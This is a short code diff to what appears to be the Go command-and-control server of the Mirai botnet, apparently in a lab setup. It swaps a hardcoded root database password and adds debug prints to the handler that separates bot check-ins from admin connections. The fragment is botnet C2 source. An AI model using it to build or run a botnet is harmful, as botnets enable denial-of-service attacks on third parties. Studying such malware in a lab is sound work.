@@ -9,7 +9,7 @@ import (
 
 const DatabaseAddr string   = "127.0.0.1"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabasePass string   = "lablab"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
@@ -54,13 +54,18 @@ func initialHandler(conn net.Conn) {
 
     conn.SetDeadline(time.Now().Add(10 * time.Second))
 
+    //conn.Write([]byte("(Press any key to continue.)"))
+
     buf := make([]byte, 32)
     l, err := conn.Read(buf)
     if err != nil || l <= 0 {
         return
     }
 
+    //fmt.Println(buf)
+
     if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
+        fmt.Println("NewBot.")
         if buf[3] > 0 {
             string_len := make([]byte, 1)
             l, err := conn.Read(string_len)
@@ -81,6 +86,7 @@ func initialHandler(conn net.Conn) {
             NewBot(conn, buf[3], "").Handle()
         }
     } else {
+        fmt.Println("NewAdmin.")
         NewAdmin(conn).Handle()
     }
 }
